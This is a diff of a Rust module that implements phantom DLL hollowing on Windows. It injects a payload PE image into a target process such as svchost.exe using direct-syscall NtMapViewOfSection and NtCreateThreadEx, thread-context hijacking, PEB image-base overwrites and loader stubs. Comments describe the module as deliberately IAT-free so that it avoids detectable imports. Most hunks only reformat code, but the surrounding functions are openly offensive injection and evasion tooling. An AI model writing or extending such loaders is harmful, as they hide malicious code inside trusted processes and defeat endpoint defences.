@@ -36,16 +36,18 @@
     any(target_arch = "x86_64", target_arch = "aarch64")
 ))]
 
+use crate::win_types::OBJECT_ATTRIBUTES;
+use crate::win_types::{CONTEXT, CONTEXT_FULL, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
 use anyhow::{anyhow, Result};
 use std::ffi::c_void;
-use crate::win_types::OBJECT_ATTRIBUTES;
-use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
-use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
-use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, SEC_COMMIT};
-use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
-use crate::win_types::{CONTEXT, CONTEXT_FULL, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
 use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC;
+use windows_sys::Win32::System::Diagnostics::Debug::{
+    IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
+};
 use windows_sys::Win32::System::Memory::PAGE_READONLY;
+use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, SEC_COMMIT};
+use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
+use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
 // ── NT constants (not exported by winapi) ────────────────────────────────────
 
 const NT_SECTION_ALL_ACCESS: u32 = 0x000F_001F;
@@ -62,6 +64,8 @@ const NT_FILE_SHARE_DELETE: u32 = 0x0004;
 const NT_FILE_SYNC_IO_NONALERT: u32 = 0x0000_0020;
 const NT_FILE_NON_DIRECTORY: u32 = 0x0000_0040;
 const NT_SEC_IMAGE: u32 = 0x0100_0000;
+const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
+const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;
 #[cfg(target_arch = "x86_64")]
 const EXPECTED_PE_MACHINE: u16 = 0x8664;
 #[cfg(target_arch = "aarch64")]
@@ -223,9 +227,8 @@ unsafe fn get_env_from_peb(key: &str) -> Option<String> {
 /// `std::env::var` to avoid creating a `kernel32!GetEnvironmentVariableW`
 /// IAT entry in this otherwise IAT-free module.
 fn host_candidate_paths() -> Vec<String> {
-    let sys_dir = unsafe {
-        get_env_from_peb("SystemRoot").unwrap_or_else(|| r"C:\Windows".to_string())
-    };
+    let sys_dir =
+        unsafe { get_env_from_peb("SystemRoot").unwrap_or_else(|| r"C:\Windows".to_string()) };
     let sys32 = format!(r"{}\System32", sys_dir);
     [
         format!(r"{}\svchost.exe", sys32),
@@ -596,7 +599,8 @@ unsafe fn fix_iat_remote(
     }
 
     let import_rva = import_dir.VirtualAddress as usize;
-    let desc_size = std::mem::size_of::<windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR>();
+    let desc_size =
+        std::mem::size_of::<windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR>();
 
     let mut desc_idx = 0;
     loop {
@@ -776,8 +780,8 @@ unsafe fn apply_section_protections(
         }
 
         // Determine target protection from section characteristics.
-        let is_exec = sec.Characteristics & windows_sys::Win32::System::SystemServices::IMAGE_SCN_MEM_EXECUTE != 0;
-        let is_write = sec.Characteristics & windows_sys::Win32::System::SystemServices::IMAGE_SCN_MEM_WRITE != 0;
+        let is_exec = sec.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
+        let is_write = sec.Characteristics & IMAGE_SCN_MEM_WRITE != 0;
 
         let target_prot = if is_exec && is_write {
             PAGE_EXECUTE_READWRITE
@@ -895,9 +899,7 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
 
     let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
     if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
-        return Err(anyhow!(
-            "phantom_dll_hollow: DOS signature mismatch"
-        ));
+        return Err(anyhow!("phantom_dll_hollow: DOS signature mismatch"));
     }
     let e_lfanew = (*dos).e_lfanew as usize;
     if e_lfanew == 0 || e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
@@ -1331,8 +1333,7 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
                             }
                             // Rebase and validate.
                             let cb_va = (cb_va_raw as isize + delta) as usize;
-                            if cb_va >= remote_base_usize
-                                && cb_va < remote_base_usize + image_size
+                            if cb_va >= remote_base_usize && cb_va < remote_base_usize + image_size
                             {
                                 tls_callback_vas.push(cb_va);
                             }
@@ -1366,8 +1367,8 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
         0
     };
 
-    let needs_stub = !tls_callback_vas.is_empty()
-        || (pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0);
+    let needs_stub =
+        !tls_callback_vas.is_empty() || (pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0);
 
     // Build the loader stub if needed, otherwise jump directly to entry point.
     let thread_start_va = if needs_stub {
@@ -1452,7 +1453,8 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
             &mut stub_mem as *mut _ as u64,
             0u64,
             &mut stub_alloc_size as *mut _ as u64,
-            (windows_sys::Win32::System::Memory::MEM_COMMIT | windows_sys::Win32::System::Memory::MEM_RESERVE) as u64,
+            (windows_sys::Win32::System::Memory::MEM_COMMIT
+                | windows_sys::Win32::System::Memory::MEM_RESERVE) as u64,
             crate::win_types::PAGE_READWRITE as u64,
         );
         let alloc_ok = match alloc_s {
@@ -1684,9 +1686,7 @@ pub unsafe fn phantom_dll_hollow_into_process(
         ));
     }
     if (*nt).OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
-        return Err(anyhow!(
-            "phantom_dll_hollow_into_process: not a PE64 image"
-        ));
+        return Err(anyhow!("phantom_dll_hollow_into_process: not a PE64 image"));
     }
     if (*nt).FileHeader.Machine != EXPECTED_PE_MACHINE {
         return Err(anyhow!(
@@ -1760,9 +1760,7 @@ pub unsafe fn phantom_dll_hollow_into_process(
         0u64,
         PAGE_READWRITE as u64,
     )
-    .map_err(|e| anyhow!(
-        "phantom_dll_hollow_into_process: NtMapViewOfSection(local) SSN: {e}"
-    ))?;
+    .map_err(|e| anyhow!("phantom_dll_hollow_into_process: NtMapViewOfSection(local) SSN: {e}"))?;
     if s < 0 || local_base.is_null() {
         close_handle!(h_section);
         return Err(anyhow!(
@@ -1884,8 +1882,8 @@ pub unsafe fn phantom_dll_hollow_into_process(
             (windows_sys::Win32::System::Threading::THREAD_SET_CONTEXT
                 | windows_sys::Win32::System::Threading::THREAD_GET_CONTEXT
                 | windows_sys::Win32::System::Threading::THREAD_SUSPEND_RESUME) as u64,
-            0u64, // handle attributes
-            0u64, // flags
+            0u64,                               // handle attributes
+            0u64,                               // flags
             &mut found_thread as *mut _ as u64, // OUT: receives thread handle
         );
 
@@ -1927,9 +1925,7 @@ pub unsafe fn phantom_dll_hollow_into_process(
                 0u64,
                 0u64,
             )
-            .map_err(|e| {
-                anyhow!("phantom_dll_hollow_into_process: NtCreateThreadEx SSN: {e}")
-            })?;
+            .map_err(|e| anyhow!("phantom_dll_hollow_into_process: NtCreateThreadEx SSN: {e}"))?;
             if s < 0 || new_thread.is_null() {
                 close_handle!(h_process);
                 close_handle!(h_section);
@@ -2142,9 +2138,7 @@ pub unsafe fn phantom_dll_hollow_into_process(
         &remote_base_usize as *const _ as *const c_void,
         std::mem::size_of::<usize>(),
     ) {
-        tracing::warn!(
-            "phantom_dll_hollow_into_process: failed to update PEB.ImageBaseAddress"
-        );
+        tracing::warn!("phantom_dll_hollow_into_process: failed to update PEB.ImageBaseAddress");
     }
 
     // ── Phase 4: Build loader stub (TLS callbacks, .pdata, DllMain) and resume ─
@@ -2196,8 +2190,7 @@ pub unsafe fn phantom_dll_hollow_into_process(
                                 break;
                             }
                             let cb_va = (cb_va_raw as isize + delta) as usize;
-                            if cb_va >= remote_base_usize
-                                && cb_va < remote_base_usize + image_size
+                            if cb_va >= remote_base_usize && cb_va < remote_base_usize + image_size
                             {
                                 tls_callback_vas.push(cb_va);
                             }
@@ -2231,8 +2224,8 @@ pub unsafe fn phantom_dll_hollow_into_process(
         0
     };
 
-    let needs_stub = !tls_callback_vas.is_empty()
-        || (pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0);
+    let needs_stub =
+        !tls_callback_vas.is_empty() || (pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0);
 
     // Build the loader stub if needed, otherwise jump directly to entry point.
     let thread_start_va = if needs_stub {
@@ -2317,7 +2310,8 @@ pub unsafe fn phantom_dll_hollow_into_process(
             &mut stub_mem as *mut _ as u64,
             0u64,
             &mut stub_alloc_size as *mut _ as u64,
-            (windows_sys::Win32::System::Memory::MEM_COMMIT | windows_sys::Win32::System::Memory::MEM_RESERVE) as u64,
+            (windows_sys::Win32::System::Memory::MEM_COMMIT
+                | windows_sys::Win32::System::Memory::MEM_RESERVE) as u64,
             crate::win_types::PAGE_READWRITE as u64,
         );
         let alloc_ok = match alloc_s {
@@ -2537,10 +2531,10 @@ fn push_arm64_br(stub: &mut Vec<u8>, reg: u8) {
 #[cfg(all(windows, target_arch = "aarch64"))]
 fn push_arm64_dll_entry_call(stub: &mut Vec<u8>, target: u64, image_base: u64) {
     push_arm64_mov_imm64(stub, 0, image_base); // x0 = hinstDLL
-    push_arm64_mov_imm64(stub, 1, 1);          // x1 = DLL_PROCESS_ATTACH
-    push_arm64_mov_imm64(stub, 2, 0);          // x2 = lpvReserved = NULL
-    push_arm64_mov_imm64(stub, 16, target);    // x16 = target address
-    push_arm64_blr(stub, 16);                   // blr x16
+    push_arm64_mov_imm64(stub, 1, 1); // x1 = DLL_PROCESS_ATTACH
+    push_arm64_mov_imm64(stub, 2, 0); // x2 = lpvReserved = NULL
+    push_arm64_mov_imm64(stub, 16, target); // x16 = target address
+    push_arm64_blr(stub, 16); // blr x16
 }
 
 /// Emit `BRK #imm16` — ARM64 breakpoint (used as infinite halt).
@@ -2572,7 +2566,9 @@ mod tests {
                                                                      // NumberOfSections at 0x86
         buf[0x86..0x88].copy_from_slice(&(1u16).to_le_bytes());
         // SizeOfOptionalHeader at 0x94
-        let opt_header_size = std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_OPTIONAL_HEADER6464>();
+        let opt_header_size = std::mem::size_of::<
+            windows_sys::Win32::System::Diagnostics::Debug::IMAGE_OPTIONAL_HEADER6464,
+        >();
         buf[0x94..0x96].copy_from_slice(&(opt_header_size as u16).to_le_bytes());
         // Magic at 0x98 (OptionalHeader +0)
         buf[0x98..0x9A].copy_from_slice(&(0x020Bu16).to_le_bytes()); // PE64
